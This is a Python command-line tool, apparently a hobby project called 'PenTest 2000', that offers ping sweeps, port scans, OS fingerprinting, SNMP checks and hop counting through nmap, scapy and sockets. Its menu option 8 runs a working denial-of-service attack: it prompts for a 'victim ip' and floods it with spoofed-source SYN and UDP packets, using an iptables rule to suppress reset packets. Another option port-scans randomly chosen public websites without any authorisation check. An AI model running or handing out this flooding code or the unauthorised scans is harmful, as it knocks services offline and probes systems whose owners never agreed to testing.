#!/usr/bin/env python3
# import inquirer
import optparse
import argparse
import subprocess
import sys
import random
import time
from datetime import datetime
import multiprocessing
import os
import socket
import nmap
from math import ceil, floor
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

lock = multiprocessing.Lock()


def user_guide():
    user_guide_text = open("user_guide.txt", "r+")
    lines = user_guide_text.readlines()
    return lines


def ping_scan(ips, alives):
    dev_null = open(os.devnull, 'w')
    while True:
        ip = ips.get()
        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-q', '-c1', ip], stdout=dev_null)
            alives.put(ip)
        except:
            pass


def port_identification(port):
    temp_port = port.get()

    my_socket_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket_tcp.settimeout(10)
    result_tcp = my_socket_tcp.connect_ex((ip, temp_port))

    if not only_open_ports:
        ports_dat = open("ports.dat", "a")
        if result_tcp == 0:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " open\n")
                ports_dat.close()
            my_socket_tcp.close()

        elif result_tcp == 11:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " filtered\n")
                ports_dat.close()
            my_socket_tcp.close()
        else:
            with lock:
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " closed\n")
                ports_dat.close()
            my_socket_tcp.close()
    else:
        if result_tcp == 0:
            with lock:
                open_ports_dat = open("open_ports.dat", "a")
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                open_ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " open\n")
                open_ports_dat.close()
            my_socket_tcp.close()
        elif result_tcp == 11:
            with lock:
                open_ports_dat = open("open_ports.dat", "a")
                try:
                    name = socket.getservbyport(temp_port)
                except OSError:
                    name = "unknown"
                except KeyboardInterrupt:
                    sys.exit("You pressed Ctrl + C")
                open_ports_dat.write("Port: " + str(temp_port) + "(" + str(name) + ")" + " filtered\n")
                open_ports_dat.close()
            my_socket_tcp.close()


def number_of_hops(host_name):
    for i in range(1, 28):
        packet = IP(dst=host_name, ttl=i) / UDP(dport=33434)
        # Send the packet and get a reply
        response = sr1(packet, verbose=0)
        # response.show()
        if response is None:
            # If there is no reply we break the loop
            break
        # type == 3 means hosts is unreachable because we have already reached our destination
        elif response.type == 3:
            # Hopping finished and the desired destination has been found
            print("Host is " + str(i - 1) + " hop(s) away", response.src + "\n\n")
            break
        else:
            # Trying to go to the host
            print(str(i) + " hop(s): ", response.src)


def multiprocess_ping_scan(base_of_ip, check=True):
    ip_address = multiprocessing.Queue()
    live_hosts = multiprocessing.Queue()
    processes = []

    if check:
        icmp_dat = open("icmp.dat", "w+")
        icmp_dat.close()
        icmp_dat = open("icmp.dat", "a+")

        for i in range(256):
            processes.append(multiprocessing.Process(target=ping_scan, args=(ip_address, live_hosts)))

        for i in processes:
            i.start()

        for i in range(1, 256):
            ip_address.put(base_of_ip + '{0}'.format(i))

        for i in processes:
            ip_address.put(None)

        print("Scanning online hosts...")

        for i in processes:
            i.join()

        print("\n\n---------- LIVE HOSTS ----------")
        while not live_hosts.empty():
            host = live_hosts.get()
            icmp_dat.write(host + "\n")
            print("         " + host)
        print("--------------------------------\n\n")
        icmp_dat.close()
    else:
        icmp_dat = open("icmp.dat", "r")
        total_lines = len(icmp_dat.readlines())
        icmp_dat.seek(0, 0)
        ip_adds = []
        for i in range(total_lines):
            ip_adds.append(icmp_dat.readline().split())

        for i in range(total_lines):
            processes.append(multiprocessing.Process(target=ping_scan, args=(ip_address, live_hosts)))

        for i in processes:
            i.start()

        for i in ip_adds:
            ip_address.put(i[0])

        for i in processes:
            ip_address.put(None)

        for i in processes:
            i.join()

        icmp_dat.close()
        icmp_dat = open("icmp.dat", "w")
        icmp_dat.close()
        icmp_dat = open("icmp.dat", "a")
        while not live_hosts.empty():
            host = live_hosts.get()
            icmp_dat.write(host + "\n")
        icmp_dat.close()


def multiprocess_port_scan():
    ports = multiprocessing.Queue()
    port_diff = int(end_port) - int(start_port)

    if port_diff > 1000:
        port_diff_pieces = port_diff / 1000
        port_diff_pieces = ceil(port_diff_pieces)
        first_number = floor(int(start_port) / 1000)

        for t in range(first_number, first_number + port_diff_pieces):
            for i in range(t * 1000, t * 1000 + 1000):
                ports.put(i)

            processes = [multiprocessing.Process(target=port_identification, args=(ports,)) for j in
                         range(1000)]

            for i in processes:
                i.start()

            for i in processes:
                i.join(10)

    else:
        for i in range(int(start_port), int(end_port) + 1):
            ports.put(i)

        processes = [multiprocessing.Process(target=port_identification, args=(ports,)) for j in
                     range(abs(int(end_port) + 1 - int(start_port)))]

        for i in processes:
            i.start()

        for i in processes:
            i.join(10)


def port_scan_open_only():
    open("open_ports.dat", "w+").close()
    open_ports_dat = open("open_ports.dat", "a")

    nm = nmap.PortScanner()
    print("\nChecking hosts...")
    multiprocess_ping_scan('place_holder', False)
    print("\nPort scan has started...")

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)
    temp = []
    ip_adds = []

    for i in range(total_lines):
        temp.append(icmp_dat.readline().split())

    for k in range(len(temp)):
        ip_adds.append(temp[k][0])

    for ip in ip_adds:
        t1 = datetime.now()
        open_ports_dat.write(ip + "\n")
        nm.scan(ip, arguments="-sU -sT -T3")

        try:
            if len(nm[ip].all_protocols()) > 0:
                proto_tcp = nm[ip].all_protocols()[0]

                open_ports_dat.write("TCP:\n")
                for port in nm[ip][proto_tcp]:
                    open_ports_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + nm[ip][proto_tcp][port][
                            'state'] + "\n")
                    # print(str(port))
                    # print(nm[ip][proto][port]['state'])
                    # print(nm[ip][proto][port]['name'])

                if len(nm[ip].all_protocols()) > 1:
                    proto_udp = nm[ip].all_protocols()[1]
                    open_ports_dat.write("UDP:\n")
                    for port in nm[ip][proto_udp]:
                        open_ports_dat.write(
                            "Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + nm[ip][proto_udp][port][
                                'state'] + "\n")
        except KeyError:
            pass
        t2 = datetime.now()
        print("Port scan for " + ip + " took " + str(t2 - t1))

    open_ports_dat.close()


def ip_proto_port_scan_for_web_server(preset):
    if preset:
        print("\nProcess has started...\n")
        open("web.dat", "w+").close()
        web_dat = open("web.dat", "a")
        nm = nmap.PortScanner()
        websites_txt = open("websites.txt", "r")
        total_lines = len(websites_txt.readlines())
        websites_txt.seek(0, 0)

        websites_list = []
        for i in range(total_lines):
            websites_list.append(websites_txt.readline().split())

        websites_ip_list = []
        rand_check = True
        selected_websites = []
        website_url_list = []

        for i in range(10):
            rand_website = random.randint(0, 60)
            for j in selected_websites:
                if rand_website == j:
                    rand_check = False
                    break

            if rand_check:
                website_url_list.append(websites_list[rand_website][0])
                websites_ip_list.append(socket.gethostbyname(str(websites_list[rand_website][0])))

        cnt_for_url = 0
        for ip in websites_ip_list:
            t1 = datetime.now()
            website_url = website_url_list[cnt_for_url]
            web_dat.write("URL: " + website_url + " Address: " + ip + "\n")
            nm.scan(ip, arguments="-sU -sT -T3")

            try:
                if len(nm[ip].all_protocols()) > 0:
                    proto = nm[ip].all_protocols()[0]
                    web_dat.write("TCP:\n")
                    for port in nm[ip][proto]:
                        web_dat.write("Port: " + str(port) + "(" + nm[ip][proto][port][
                            'name'] + ") " + nm[ip][proto][port]['state'] + "\n")



                t2 = datetime.now()
                print("Port scan for " + website_url + " (" + ip + ") " + " took " + str(t2 - t1) + "\n")
                cnt_for_url += 1

            except KeyError:
                pass

    else:
        custom_url = input("\nPlease enter a URL (Ex: www.google.com): ")
        try:
            url_ip = socket.gethostbyname(custom_url)
            print("\nProcess has started...\n")
            t1 = datetime.now()
            open("web.dat", "w+").close()
            web_dat = open("web.dat", "a")
            nm = nmap.PortScanner()

            web_dat.write("URL: " + custom_url + " Address: " + url_ip + "\n")
            nm.scan(url_ip, arguments="--open -PN")

            try:
                if len(nm[url_ip].all_protocols()) > 0:
                    proto = nm[url_ip].all_protocols()[0]
                    web_dat.write("Protocol: " + proto + "\n")
                    for port in nm[url_ip][proto]:
                        web_dat.write(
                            "Port: " + str(port) + "(" + nm[url_ip][proto][port]['name'] + ") " +
                            nm[url_ip][proto][port][
                                'state'] + "\n")
                        # print(str(port))
                        # print(nm[ip][proto][port]['state'])
                        # print(nm[ip][proto][port]['name'])
            except KeyError:
                pass

            t2 = datetime.now()
            print("\nPort scan for " + custom_url + " (" + url_ip + ") " + " took " + str(t2 - t1) + "\n")

        except socket.gaierror:
            print("\nWrong URL. Please try again.\n")
        except socket.herror:
            print("\nHost seems offline. Please try again later or try another host.\n")
        except:
            print("\nSomething went wrong. Please try again.\n")


def os_fingerprint_detection():
    open("os_fingerprint.dat", "w+").close()
    os_fingerprint_dat = open("os_fingerprint.dat", "a")

    t1 = datetime.now()
    nm = nmap.PortScanner()

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)
    temp = []
    ip_adds = []

    for i in range(total_lines):
        temp.append(icmp_dat.readline().split())

    for k in range(len(temp)):
        ip_adds.append(temp[k][0])

    for ip in ip_adds:
        print("OS Fingerprint Detection for " + ip)
        for i in range(1, 11):
            try:
                nm.scan(ip, arguments="-O -v --max-retries 5")
                print("Vendor -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['vendor']))
                print("OS Family -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osfamily']))
                print("OS Version -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osgen']))
                os_fingerprint_dat.write(ip + '\n')
                os_fingerprint_dat.write("Vendor -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['vendor']) + "\n")
                os_fingerprint_dat.write("OS Family -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osfamily']) + "\n")
                if nm[ip]['osmatch'][1]['osclass'][0]['osgen'] is not None:
                    os_fingerprint_dat.write("OS Version -> " + str(nm[ip]['osmatch'][1]['osclass'][0]['osgen']) + "\n")
                else:
                    os_fingerprint_dat.write("OS Version -> Unknown\n")

                break
            except IndexError:
                print("Try " + str(i) + " Failed... Trying Again...")
                continue
        print("\n")

    os_fingerprint_dat.close()
    t2 = datetime.now()
    print("OS Fingerprint Detection took " + str(t2 - t1))


def snmp_scan():
    open("snmp.dat", "w+").close()

    print("\nChecking hosts...")
    multiprocess_ping_scan('place_holder', False)
    print("\nSNMP scan has started...")

    icmp_dat = open("icmp.dat", "r")
    total_lines = len(icmp_dat.readlines())
    icmp_dat.seek(0, 0)

    ip_adds = []
    for i in range(total_lines):
        ip_adds.append(icmp_dat.readline().split())
    icmp_dat.close()

    snmp_dat = open("snmp.dat", "a")
    for i in range(len(ip_adds)):
        ip = ip_adds[i][0]
        print("\n" + ip)

        nm = nmap.PortScanner()
        nm.scan(ip, '161-162', arguments="-sU -sT")

        snmp_dat.write(ip + '\n')
        try:
            if len(nm[ip].all_protocols()) > 0:
                proto_tcp = nm[ip].all_protocols()[0]
                for port in nm[ip][proto_tcp]:
                    print("Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + "(" + proto_tcp + ") " +
                          nm[ip][proto_tcp][port][
                              'state'])
                    snmp_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_tcp][port]['name'] + ") " + "(" + proto_tcp + ") " +
                        nm[ip][proto_tcp][port][
                            'state'] + "\n")

            if len(nm[ip].all_protocols()) > 1:
                proto_udp = nm[ip].all_protocols()[1]
                for port in nm[ip][proto_udp]:
                    print("Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + "(" + proto_udp + ") " +
                          nm[ip][proto_udp][port][
                              'state'])
                    snmp_dat.write(
                        "Port: " + str(port) + "(" + nm[ip][proto_udp][port]['name'] + ") " + "(" + proto_udp + ") " +
                        nm[ip][proto_udp][port][
                            'state'] + "\n")
            print()
        except KeyError:
            pass


def syn_flood_attack(victim_ip, how_many):
    host_ip = socket.gethostbyname(socket.gethostname())

    os.system("sudo iptables -A OUTPUT -p tcp -s " + host_ip + " --tcp-flags ALL RST,ACK -j DROP")

    # monitoring = multiprocessing.Process(target=tcpdump_monitor, args=(victim_ip,))
    # monitoring.start()
    monitoring = subprocess.Popen("tcpdump -c" + str(int(how_many) * 1600) + " host " + victim_ip, shell=True)

    for port in range(int(start_port), int(end_port) + 1):
        for j in range(int(how_many)):
            processes = [multiprocessing.Process(target=flood, args=(victim_ip, port)) for i in range(1000)]
            for i in processes:
                i.start()
            for i in processes:
                i.join()

    # print(monitoring.pid)
    # os.system("kill -9 {0}".format(monitoring.pid))
    # monitoring.kill()
    # monitoring.terminate()
    # monitoring.terminate()
    # os.system("sudo tcpdump -c1 dst " + victim_ip)
    # monitoring.join()

    os.system("sudo iptables -D OUTPUT -p tcp -s " + host_ip + " --tcp-flags ALL RST,ACK -j DROP")
    print("\n\nAttack Done!\n")


# def tcpdump_monitor(ip):
#     os.system("sudo tcpdump dst " + ip)
#     subprocess.Popen(['sudo', 'tcpdump', 'dst', ip], shell=True)


def flood(ip, dst_port):
    rand_ip = random_ips[random.randint(1, 254)]

    if for_tcp:
        pkt = IP(dst=ip, src=rand_ip, ttl=64) / TCP(sport=random.randint(1024, 10000), dport=dst_port, flags='S',
                                                    seq=random.randint(1024, 10000), window=random.randint(1024, 10000))

        send(pkt, verbose=0)

    elif for_udp:
        pkt2 = IP(dst=ip, src=rand_ip, ttl=64) / UDP(sport=random.randint(1024, 10000), dport=dst_port)

        send(pkt2, verbose=0)

    elif for_tcp_and_udp:
        pkt = IP(dst=ip, src=rand_ip, ttl=64) / TCP(sport=random.randint(1024, 10000), dport=dst_port, flags='S',
                                                    seq=random.randint(1024, 10000), window=random.randint(1024, 10000))

        send(pkt, verbose=0)

        pkt2 = IP(dst=ip, src=rand_ip, ttl=64) / UDP(sport=random.randint(1024, 10000), dport=dst_port)

        send(pkt2, verbose=0)


while True:
    print("\n-------------------- Welcome to PenTest 2000 (v0.1) --------------------\n")
    print("-1) Exit")
    print("0) Open user guide ( alternatively type 'pentest.py -h' )")
    print("1) Ping scan your local network")
    print("2) Port scan for the ports of the online hosts")
    print("3) Port scan for the open ports of the online hosts")
    print("4) OS fingerprint detection for the online hosts")
    print("5) Find how many hops away a host (url) is")
    print("6) Scan a web server to find its ip, protocols and ports")
    print("7) Check if any of the live hosts have their SNMP ports open")
    print("8) Perform a SYN Flood Attack")

    choice = input("\nYour choice: \n")

    if choice == '-1' or choice.lower() == 'exit':
        sys.exit("Exiting PenTest 2000...")

    if choice == '0':
        for i in user_guide():
            sys.stdout.write(i)
        print("\n")

    if choice == '1':
        ip_address = input("\nPlease enter an ip (Ex: 192.168.1.40): ")

        counter = 0
        ip_base = ""

        for i in ip_address:
            if counter == 3:
                break
            if i == '.':
                counter += 1
            ip_base += i

        if counter != 3:
            print("\n")
            continue

        if len(ip_base) < 6:
            print("\n")
            continue

        multiprocess_ping_scan(ip_base)

    if choice == '2':
        only_open_ports = False
        open("ports.dat", "w+").close()

        port_range = input("\nPlease enter a port (Ex: 80) or a port range (Ex: 20-80):\n")
        start_port = ''
        end_port = ''
        minus_check = False

        if len(port_range) > 0:
            for i in port_range:
                if i == "-":
                    minus_check = True
                    continue
                if not minus_check:
                    start_port += i
                if minus_check:
                    end_port += i

            if len(end_port) < 1:
                end_port = start_port

            try:
                if int(end_port) < int(start_port):
                    temp = start_port
                    start_port = end_port
                    end_port = temp
            except ValueError:
                print("\n\nPlease Try Again With Correct Values\n\n")
                continue
        else:
            print("\n\nPlease Try Again With Correct Values\n\n")
            continue

        print("\nSTART PORT " + start_port)
        print("END PORT " + end_port)

        print("\nChecking hosts...")
        multiprocess_ping_scan('place_holder', False)

        icmp_dat = open("icmp.dat", "r")
        total_lines = len(icmp_dat.readlines())
        icmp_dat.seek(0, 0)

        ip_adds = []
        for i in range(total_lines):
            ip_adds.append(icmp_dat.readline().split())
        icmp_dat.close()

        start_time = datetime.now()
        print("\nPort scan has started...")

        for j in range(len(ip_adds)):
            ports_dat = open("ports.dat", "a")
            t1 = datetime.now()
            ip = ip_adds[j][0]

            ports_dat.write(ip + "\nUDP:\n")

            iterations = ceil((int(end_port) - int(start_port)) / 200)

            nm = nmap.PortScanner()

            for i in range(iterations):
                first = i * 200 + 1
                last = i * 200 + 200
                nm.scan(ip, str(first) + '-' + str(last), arguments="-vvvvvvvv -sU -T5")

                if len(nm[ip].all_protocols()) > 0:
                    try:
                        proto = nm[ip].all_protocols()[0]
                        for port in nm[ip][proto]:
                            ports_dat.write(
                                "Port: " + str(port) + "(" + nm[ip][proto][port]['name'] + ") " + "(" + proto + ") " +
                                nm[ip][proto][port][
                                    'state'] + "\n")
                    except KeyError:
                        pass

            ports_dat.write("TCP:\n")
            ports_dat.close()

            multiprocess_port_scan()

            t2 = datetime.now()
            print("Port scan for " + ip + " took " + str(t2 - t1))

        end_time = datetime.now()
        print("\nAll done in " + str(end_time - start_time) + "\n\n")

    if choice == '3':
        only_open_ports = True
        open("open_ports.dat", "w+").close()

        port_range = input("\nPlease enter a port (Ex: 80) or a port range (Ex: 20-80) or all (Ex: all):\n")
        start_port = ''
        end_port = ''
        minus_check = False

        if port_range.lower() == 'all':
            t1 = datetime.now()
            port_scan_open_only()
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")

        else:
            if len(port_range) > 0:
                for i in port_range:
                    if i == "-":
                        minus_check = True
                        continue
                    if not minus_check:
                        start_port += i
                    if minus_check:
                        end_port += i

                if len(end_port) < 1:
                    end_port = start_port

                try:
                    if int(end_port) < int(start_port):
                        temp = start_port
                        start_port = end_port
                        end_port = temp
                except ValueError:
                    print("\n\nPlease Try Again With Correct Values\n\n")
                    continue
            else:
                print("\n\nPlease Try Again With Correct Values\n\n")
                continue

            print("\nSTART PORT " + start_port)
            print("END PORT " + end_port)

            print("\nChecking hosts...")
            multiprocess_ping_scan('place_holder', False)

            icmp_dat = open("icmp.dat", "r")
            total_lines = len(icmp_dat.readlines())
            icmp_dat.seek(0, 0)

            ip_adds = []
            for i in range(total_lines):
                ip_adds.append(icmp_dat.readline().split())

            start_time = datetime.now()
            print("\nPort scan has started...")

            open_ports_dat = open("open_ports.dat", "a")
            for j in range(len(ip_adds)):
                t1 = datetime.now()
                ip = ip_adds[j][0]

                open_ports_dat.write(ip + "\n")
                open_ports_dat.write("UDP:\n")
                nm = nmap.PortScanner()
                nm.scan(ip, str(start_port) + '-' + str(end_port), arguments="--open -sU")
                try:
                    if len(nm[ip].all_protocols()) > 0:

                        proto = nm[ip].all_protocols()[0]
                        for port in nm[ip][proto]:
                            open_ports_dat.write(
                                "Port: " + str(port) + "(" + nm[ip][proto][port]['name'] + ") " + "(" + proto + ") " +
                                nm[ip][proto][port][
                                    'state'] + "\n")
                except KeyError:
                    pass

                open_ports_dat.write("TCP:\n")
                open_ports_dat.close()

                multiprocess_port_scan()

                t2 = datetime.now()
                total_time = t2 - t1
                print("Port scan for " + ip + " took " + str(total_time))

            open_ports_dat.close()
            end_time = datetime.now()
            print("\nAll done in " + str(end_time - start_time) + "\n\n")

    if choice == '4':
        print("\nChecking hosts...")
        multiprocess_ping_scan('place_holder', False)
        os_fingerprint_detection()

    if choice == '5':
        host = input("Please enter a host name (Ex: www.google.com):\n")
        number_of_hops(host)

    if choice == '6':
        print("\n\n1) Enter your own URL")
        print("2) Let the program pick 10 random websites out of 60 preset websites\n")
        web_scan_choice = input("Your choice: \n")
        if web_scan_choice == '1':
            t1 = datetime.now()
            ip_proto_port_scan_for_web_server(False)
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")
        else:
            t1 = datetime.now()
            ip_proto_port_scan_for_web_server(True)
            t2 = datetime.now()
            print("\nAll done in " + str(t2 - t1) + "\n\n")

    if choice == '7':
        t1 = datetime.now()
        snmp_scan()
        t2 = datetime.now()
        print("\nAll done in " + str(t2 - t1) + "\n")

    if choice == '8':
        victim_ip = input("\nPlease enter the victim ip (Ex: 192.168.1.87):\n")
        proto_type = input("Please enter the transportation protocol (Ex: tcp or udp or both):\n")

        for_tcp = False
        for_udp = False
        for_tcp_and_udp = False

        if proto_type.lower() == "tcp":
            for_tcp = True

        elif proto_type.lower() == "udp":
            for_udp = True

        elif proto_type.lower() == "both":
            for_tcp_and_udp = True

        else:
            print("\n\nPlease enter a correct transportation protocol\n\n")
            continue

        # print(str(for_tcp) + " " + str(for_udp) + " " + str(for_tcp_and_udp))
        port_range = input("Please enter a port (Ex: 80) or a port range (Ex: 20-80):\n")

        start_port = ''
        end_port = ''
        minus_check = False

        if len(port_range) > 0:
            for i in port_range:
                if i == "-":
                    minus_check = True
                    continue
                if not minus_check:
                    start_port += i
                if minus_check:
                    end_port += i

            if len(end_port) < 1:
                end_port = start_port

            try:
                if int(end_port) < int(start_port):
                    temp = start_port
                    start_port = end_port
                    end_port = temp
            except ValueError:
                print("\n\nPlease Try Again With Correct Values\n\n")
                continue
        else:
            print("\n\nPlease Try Again With Correct Values\n\n")
            continue

        how_many = input("Please enter how many thousand syn packets you want to send (Ex: 1 -> 1000):\n")

        try:
            if int(how_many) > 0:

                random_ips = []
                for i in range(1, 256):
                    random_ips.append('192.168.1.' + str(i))

                t1 = datetime.now()
                syn_flood_attack(victim_ip, how_many)
                t2 = datetime.now()
                print("SYN Flood Attack took " + str(t2 - t1) + "\n")
            else:
                print("\n\nPlease enter a positive integer for how many question\n\n")
                continue
        except ValueError:
            print("\n\nPlease enter a positive integer for how many question\n\n")
            continue

# parser = optparse.OptionParser()
# parser.add_option("-s", "--support", default=True, action="store_true", dest="help",
#                   help="Write -h or --help to see your options")
# parser.add_option("-p", "--ping-scan", dest="ping", help="Write -h or --help to see your options")
# parser.add_option("-g", "--garkt", dest="garkt", action="store_true", help="Write -h or --help to see your options")
# # parser.add_option("-w", "--w", dest="write", help="Write -h or --help to see your options")
# options = parser.parse_args()[0]
#
# t1 = datetime.now()
# if options.ping:
#     counter = 0
#     ip_base = ""
#
#     for i in options.ping:
#         if counter == 3:
#             break
#         if i == '.':
#             counter += 1
#         ip_base += i
#
#     multiprocess_ping_scan(ip_base, True)
#     t2 = datetime.now()
#     print("Ping scan took " + str(t2-t1))
#
# if options.garkt:
#     multiprocess_ping_scan('12312312', False)
#     icmp_dat = open("icmp.dat", "r")
#     total_lines = len(icmp_dat.readlines())
#     icmp_dat.seek(0, 0)
#     ip_adds = []
#     for i in range(total_lines):
#         ip_adds.append(icmp_dat.readline().split())
#
# if options.help:
#

